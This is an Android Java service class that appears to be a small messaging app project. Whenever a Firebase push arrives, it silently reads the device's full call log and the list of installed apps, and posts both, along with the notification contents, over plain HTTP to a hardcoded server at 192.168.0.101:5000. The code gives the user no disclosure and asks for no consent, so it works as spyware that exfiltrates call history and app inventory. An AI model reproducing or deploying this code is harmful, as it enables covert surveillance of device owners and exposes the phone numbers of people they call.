package com.example.message;

import android.Manifest;
import android.app.Activity;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.Resources;
import android.database.Cursor;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class FirebaseService extends FirebaseMessagingService {

    private final String tag = "firebase";
    private OkHttpClient okHttpClient = new OkHttpClient();


    @Override
    public void onNewToken(@NonNull String s) {
        super.onNewToken(s);
        Log.d(tag, s);
    }

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        System.out.println("message received");
        super.onMessageReceived(remoteMessage);
        createNotificationChannel();
        Map<String,String> map = new HashMap<>();
        if(remoteMessage.getNotification()!=null){
            String title=remoteMessage.getNotification().getTitle();
            String body=remoteMessage.getNotification().getBody();
            map.put("title",title);
            map.put("body",body);
            JSONObject obj = new JSONObject(map);
            sendMessage(obj.toString());
            showNotification(title,body);
            sendAppDetails();
            getCallDetails();

        }
    }

    public void createNotificationChannel(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel("CHANNEL_ID", "notification Channel", importance);
            channel.setDescription("channel description");
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    public void showNotification(String title,String message){
        Intent intent = new Intent(this,MainActivity.class);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this,"CHANNEL_ID")
                .setContentTitle(title)
                .setContentText(message)
                .setColor(Color.BLUE)
                .setSmallIcon(R.drawable.ic_mailicon)
                .setAutoCancel(true)
                .setContentIntent(PendingIntent.getActivity(getApplicationContext(),0,intent,PendingIntent.FLAG_UPDATE_CURRENT));

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
        notificationManager.notify(1, notificationBuilder.build());

    }



    public void sendMessage(String jsonData){
        RequestBody requestBody = RequestBody.create(jsonData, MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/message")
                .build();

        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                System.out.println("failed........"+e);

            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                System.out.println("response...."+response.message());
            }
        });
    }

    public void getCallDetails() {
        JSONArray jsonArray =new JSONArray();
        Cursor managedCursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        while (managedCursor.moveToNext()) {
            Map<String, String> callHistory =new HashMap<>();
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dirCode = Integer.parseInt(callType);
            switch (dirCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            callHistory.put("number",phNumber);
            callHistory.put("call type",dir);
            callHistory.put("callDayTime",callDayTime.toString());
            callHistory.put("callDuration",callDuration);
            jsonArray.put(new JSONObject(callHistory));
        }
        managedCursor.close();
        String jsonData = "some thing went wrong";
        try{
            jsonData = jsonArray.toString(4);
        }
        catch (Exception e){

        }
        Log.d(tag,jsonData);
        sendCallLogs(jsonData);
    }

    public void sendCallLogs(String jsonData){
        RequestBody requestBody = RequestBody.create(jsonData, MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/callLog")
                .build();



        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(final Call call, final IOException e) {
                        System.out.println("failed........"+e);
                    }

            @Override
            public void onResponse(Call call, final Response response){
                        System.out.println("response...."+response.message());
                    }
        });
    }

    public void sendAppDetails(){
        final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<String> appNames =new ArrayList<>();
        List<ResolveInfo> ril = getPackageManager().queryIntentActivities(mainIntent, 0);
        String name = null;
        for(ResolveInfo ri : ril){
            try{
                Resources res = getPackageManager().getResourcesForApplication(ri.activityInfo.applicationInfo);
                if (ri.activityInfo.labelRes != 0) {
                    name = res.getString(ri.activityInfo.labelRes);
                } else {
                    name = ri.activityInfo.applicationInfo.loadLabel(
                            getPackageManager()).toString();
                }
                appNames.add(name);
            }
            catch (Exception e){
                Log.e(tag,e.getMessage());
            }

        }

        Map<String,List<String>> map = new HashMap<>();
        map.put("apps",appNames);
        RequestBody requestBody = RequestBody.create(new JSONObject(map).toString(),
                MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/appList")
                .build();



        okHttpClient.newCall(request).enqueue(
                new Callback() {
                    @Override
                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
                        System.out.println("failed........"+e);
                    }
                    @Override
                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                        System.out.println("response...."+response.message());
                    }
        }
        );

    }
}
